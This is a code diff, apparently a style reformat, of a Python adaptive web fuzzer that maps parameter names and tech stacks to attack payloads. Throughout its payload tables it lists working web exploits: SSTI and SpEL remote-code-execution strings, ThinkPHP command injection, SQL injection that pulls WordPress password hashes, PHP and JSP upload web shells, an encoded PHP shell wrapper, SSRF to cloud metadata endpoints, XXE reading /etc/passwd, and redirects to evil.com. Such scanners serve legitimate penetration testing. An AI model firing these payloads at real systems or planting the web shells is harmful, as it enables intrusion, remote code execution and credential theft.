@@ -79,49 +79,71 @@ PARAM_TO_VULN: Dict[str, List[Tuple[str, float]]] = {
 
 TECH_SPECIFIC_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
     "spring": {
-        "ssti": ["${7*7}", "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
-                 "${pageContext.request.getAttribute('prefix')}",
-                 "${session.setAttribute('x','y'.getClass().forName('java.lang.Runtime').getMethod('exec','id').invoke(null))}"],
-        "spel": ["${T(java.lang.Runtime).getRuntime().exec('id')}",
-                 "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
-                 "${request.getAttribute('org.springframework.web.servlet.DispatcherServlet.CONTEXT').getBeansOfType('*.class')}"],
-        "deser": ["rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEJhY",
-                  "rO0ABXNyABRqYXZhLnNlY3VyaXR5LlByb3ZpZGVy"],
+        "ssti": [
+            "${7*7}",
+            "#{7*7}",
+            "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "${pageContext.request.getAttribute('prefix')}",
+            "${session.setAttribute('x','y'.getClass().forName('java.lang.Runtime').getMethod('exec','id').invoke(null))}",
+        ],
+        "spel": [
+            "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
+            "${request.getAttribute('org.springframework.web.servlet.DispatcherServlet.CONTEXT').getBeansOfType('*.class')}",
+        ],
+        "deser": [
+            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEJhY",
+            "rO0ABXNyABRqYXZhLnNlY3VyaXR5LlByb3ZpZGVy",
+        ],
     },
     "wordpress": {
-        "sqli": ["' OR 1=1 -- -", "1' UNION SELECT user_pass FROM wp_users -- -",
-                 "' UNION SELECT user_login,user_pass FROM wp_users -- -"],
+        "sqli": [
+            "' OR 1=1 -- -",
+            "1' UNION SELECT user_pass FROM wp_users -- -",
+            "' UNION SELECT user_login,user_pass FROM wp_users -- -",
+        ],
         "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
         "lfi": ["../../../../wp-config.php", "../../../../etc/passwd"],
     },
     "php": {
-        "lfi": ["php://filter/convert.base64-encode/resource=index.php",
-                "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
-                "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="],
-        "deser": ["O:10:\"PHPObject\":1:{s:5:\"shell\";s:6:\"whoami\";}"],
+        "lfi": [
+            "php://filter/convert.base64-encode/resource=index.php",
+            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
+            "php://input",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
+        ],
+        "deser": ['O:10:"PHPObject":1:{s:5:"shell";s:6:"whoami";}'],
         "cmdi": ["'; system('id'); '", "'; echo shell_exec('whoami'); '"],
     },
     "nodejs": {
-        "proto_pollution": ['{"__proto__":{"admin":true}}',
-                            '{"constructor":{"prototype":{"admin":true}}}',
-                            '{"__proto__":{"isAdmin":true}}'],
+        "proto_pollution": [
+            '{"__proto__":{"admin":true}}',
+            '{"constructor":{"prototype":{"admin":true}}}',
+            '{"__proto__":{"isAdmin":true}}',
+        ],
         "ssti": ["{{7*7}}", "{{7*'7'}}", "<%= 7*7 %>"],
     },
     "flask": {
-        "ssti": ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
-                 "{{lipsum.__globals__['os'].popen('id').read()}}",
-                 "{{request.application.__globals__['os'].popen('whoami').read()}}"],
+        "ssti": [
+            "{{7*7}}",
+            "{{config}}",
+            "{{''.__class__.__mro__[1].__subclasses__()}}",
+            "{{lipsum.__globals__['os'].popen('id').read()}}",
+            "{{request.application.__globals__['os'].popen('whoami').read()}}",
+        ],
     },
     "django": {
         "ssti": ["{{7*7}}", "{% debug %}", "{% load %}"],
         "sqli": ["' OR 1=1 -- -", "1' UNION SELECT 1,2,3 -- -"],
     },
     "thinkphp": {
-        "cmdi": ["s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
-                 "s=index/think\\Request/input&filter=system&data=id"],
+        "cmdi": [
+            "s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
+            "s=index/think\\Request/input&filter=system&data=id",
+        ],
     },
     "laravel": {
-        "deser": ["O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"*\";s:6:\"whoami\";}"],
+        "deser": ['O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"*";s:6:"whoami";}'],
         "sqli": ["' OR 1=1 -- -", "1' UNION SELECT 1,2,3,4,5 -- -"],
     },
     "tomcat": {
@@ -147,38 +169,62 @@ CONTENT_TYPE_HINTS: Dict[str, List[str]] = {
 }
 
 PAYLOAD_EXAMPLES: Dict[str, List[str]] = {
-    "lfi": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
-            "php://filter/convert.base64-encode/resource=index.php"],
-    "lfi_wrapper": ["php://filter/convert.base64-encode/resource=/etc/passwd",
-                    "expect://id", "phar://test.png/shell"],
-    "sqli": ["' OR '1'='1", "1' OR 1=1 -- -", "' UNION SELECT 1,2,3 -- -",
-             "1' AND SLEEP(5) -- -"],
-    "sqli_json": ['{"id": "1\' OR \'1\'=\'1"}'],
-    "ssrf": ["http://169.254.169.254/latest/meta-data/",
-             "http://127.0.0.1:8080/actuator",
-             "http://localhost:9200/"],
-    "ssrf_meta": ["http://169.254.169.254/latest/meta-data/",
-                  "http://metadata.google.internal/computeMetadata/v1/"],
-    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
-            "\"><script>alert(1)</script>"],
+    "lfi": [
+        "../../../../etc/passwd",
+        "..\\..\\..\\..\\windows\\win.ini",
+        "php://filter/convert.base64-encode/resource=index.php",
+    ],
+    "lfi_wrapper": [
+        "php://filter/convert.base64-encode/resource=/etc/passwd",
+        "expect://id",
+        "phar://test.png/shell",
+    ],
+    "sqli": ["' OR '1'='1", "1' OR 1=1 -- -", "' UNION SELECT 1,2,3 -- -", "1' AND SLEEP(5) -- -"],
+    "sqli_json": ["{\"id\": \"1' OR '1'='1\"}"],
+    "ssrf": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1:8080/actuator",
+        "http://localhost:9200/",
+    ],
+    "ssrf_meta": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+    ],
+    "xss": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        '"><script>alert(1)</script>',
+    ],
     "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
     "cmdi": ["; id", "| whoami", "` id `", "$(id)", "& ping -n 5 127.0.0.1 &"],
     "nosqli": ["' OR 1=1 /*", "admin' || 1==1 //", '{"$gt": ""}'],
-    "proto_pollution": ['{"__proto__":{"test":true}}', '{"constructor":{"prototype":{"test":true}}}'],
-    "xxe": ["<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"],
+    "proto_pollution": [
+        '{"__proto__":{"test":true}}',
+        '{"constructor":{"prototype":{"test":true}}}',
+    ],
+    "xxe": [
+        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    ],
     "open_redirect": ["//evil.com", "https://evil.com", "///evil.com"],
-    "jwt": ["eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
-            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ."],
-    "auth_bypass": ["role=admin", "admin=true", "isAdmin=true",
-                    '{"admin":true,"role":"admin"}'],
+    "jwt": [
+        "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
+    ],
+    "auth_bypass": ["role=admin", "admin=true", "isAdmin=true", '{"admin":true,"role":"admin"}'],
     "biz_logic": ["-1", "0", "999999", "-1.00", "0.01", "1000000"],
     "info_disclosure": ["../../../../etc/passwd", ".env", "debug=true"],
     "idor": ["1", "2", "3", "100", "999", "-1"],
-    "path_traversal": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
-                       "....//....//....//etc/passwd"],
+    "path_traversal": [
+        "../../../../etc/passwd",
+        "..\\..\\..\\..\\windows\\win.ini",
+        "....//....//....//etc/passwd",
+    ],
     "host_header": ["Host: evil.com", "X-Forwarded-Host: evil.com"],
     "csrf": ['<form action="/transfer" method="POST"><input name="to" value="attacker"></form>'],
-    "upload": ["<?php system($_GET['c']); ?>", "<%=Runtime.getRuntime().exec(request.getParameter(\"c\"))%>"],
+    "upload": [
+        "<?php system($_GET['c']); ?>",
+        '<%=Runtime.getRuntime().exec(request.getParameter("c"))%>',
+    ],
     "rce": ["'; system('id'); '", "'; Runtime.getRuntime().exec('id'); //"],
 }
 
@@ -193,8 +239,7 @@ class PayloadGroup:
 
 
 class AdaptiveFuzzer:
-    def __init__(self, tech_stack: Optional[List[str]] = None,
-                 content_type: str = "form"):
+    def __init__(self, tech_stack: Optional[List[str]] = None, content_type: str = "form"):
         self.tech_stack = [t.lower() for t in (tech_stack or [])]
         self.content_type = self._normalize_content_type(content_type)
 
@@ -221,31 +266,46 @@ class AdaptiveFuzzer:
                     seen_types.add(vuln_type)
                     payloads = self._build_payloads(vuln_type)
                     if payloads:
-                        groups.append(PayloadGroup(
-                            vuln_type=vuln_type,
-                            confidence=conf,
-                            payloads=payloads,
-                            param=name,
-                            content_type_hint=self.content_type,
-                        ))
+                        groups.append(
+                            PayloadGroup(
+                                vuln_type=vuln_type,
+                                confidence=conf,
+                                payloads=payloads,
+                                param=name,
+                                content_type_hint=self.content_type,
+                            )
+                        )
 
-        for suffix in ["_id", "_url", "_path", "_file", "_name", "_type",
-                        "_token", "_key", "_email", "_q", "_search"]:
+        for suffix in [
+            "_id",
+            "_url",
+            "_path",
+            "_file",
+            "_name",
+            "_type",
+            "_token",
+            "_key",
+            "_email",
+            "_q",
+            "_search",
+        ]:
             if name.endswith(suffix):
-                base = name[:-len(suffix)]
+                base = name[: -len(suffix)]
                 if base in PARAM_TO_VULN:
                     for vuln_type, conf in PARAM_TO_VULN[base]:
                         if vuln_type not in seen_types:
                             seen_types.add(vuln_type)
                             payloads = self._build_payloads(vuln_type)
                             if payloads:
-                                groups.append(PayloadGroup(
-                                    vuln_type=vuln_type,
-                                    confidence=conf * 0.85,
-                                    payloads=payloads,
-                                    param=name,
-                                    content_type_hint=self.content_type,
-                                ))
+                                groups.append(
+                                    PayloadGroup(
+                                        vuln_type=vuln_type,
+                                        confidence=conf * 0.85,
+                                        payloads=payloads,
+                                        param=name,
+                                        content_type_hint=self.content_type,
+                                    )
+                                )
 
         if not groups:
             for vuln_type in ["sqli", "xss", "ssti"]:
@@ -253,19 +313,22 @@ class AdaptiveFuzzer:
                     seen_types.add(vuln_type)
                     payloads = self._build_payloads(vuln_type)
                     if payloads:
-                        groups.append(PayloadGroup(
-                            vuln_type=vuln_type,
-                            confidence=0.20,
-                            payloads=payloads[:3],
-                            param=name,
-                            content_type_hint=self.content_type,
-                        ))
+                        groups.append(
+                            PayloadGroup(
+                                vuln_type=vuln_type,
+                                confidence=0.20,
+                                payloads=payloads[:3],
+                                param=name,
+                                content_type_hint=self.content_type,
+                            )
+                        )
 
         groups.sort(key=lambda g: -g.confidence)
         return groups
 
-    def for_response_type(self, response_sample: str,
-                          response_headers: Optional[Dict] = None) -> List[str]:
+    def for_response_type(
+        self, response_sample: str, response_headers: Optional[Dict] = None
+    ) -> List[str]:
         if not response_sample and not response_headers:
             return ["sqli", "xss", "lfi"]
 
@@ -325,9 +388,20 @@ class AdaptiveFuzzer:
         if "export" in path or "import" in path:
             hints.update(["lfi", "xxe", "cmdi"])
 
-        ordered = ["sqli", "xss", "ssrf", "lfi", "ssti", "cmdi",
-                    "auth_bypass", "biz_logic", "info_disclosure",
-                    "upload", "xxe", "graphql"]
+        ordered = [
+            "sqli",
+            "xss",
+            "ssrf",
+            "lfi",
+            "ssti",
+            "cmdi",
+            "auth_bypass",
+            "biz_logic",
+            "info_disclosure",
+            "upload",
+            "xxe",
+            "graphql",
+        ]
         return [h for h in ordered if h in hints] or []
 
     def _build_payloads(self, vuln_type: str) -> List[str]:
@@ -361,8 +435,9 @@ class AdaptiveFuzzer:
 
         return payloads
 
-    def merge_groups(self, groups_a: List[PayloadGroup],
-                     groups_b: List[PayloadGroup]) -> List[PayloadGroup]:
+    def merge_groups(
+        self, groups_a: List[PayloadGroup], groups_b: List[PayloadGroup]
+    ) -> List[PayloadGroup]:
         merged = {}
         for g in groups_a + groups_b:
             key = g.vuln_type
@@ -383,9 +458,13 @@ class AdaptiveFuzzer:
                 )
         return sorted(merged.values(), key=lambda g: -g.confidence)
 
-    def all_groups(self, param_name: str, url_path: str = "",
-                   response_sample: str = "",
-                   response_headers: Optional[Dict] = None) -> List[PayloadGroup]:
+    def all_groups(
+        self,
+        param_name: str,
+        url_path: str = "",
+        response_sample: str = "",
+        response_headers: Optional[Dict] = None,
+    ) -> List[PayloadGroup]:
         param_groups = self.for_param(param_name)
         path_hints = self.for_endpoint(url_path)
         resp_hints = self.for_response_type(response_sample, response_headers)
@@ -396,12 +475,14 @@ class AdaptiveFuzzer:
             if vt not in {g.vuln_type for g in param_groups}:
                 payloads = self._build_payloads(vt)
                 if payloads:
-                    hint_groups.append(PayloadGroup(
-                        vuln_type=vt,
-                        confidence=0.35,
-                        payloads=payloads,
-                        param=param_name,
-                        content_type_hint=self.content_type,
-                    ))
+                    hint_groups.append(
+                        PayloadGroup(
+                            vuln_type=vt,
+                            confidence=0.35,
+                            payloads=payloads,
+                            param=param_name,
+                            content_type_hint=self.content_type,
+                        )
+                    )
 
         return self.merge_groups(param_groups, hint_groups)
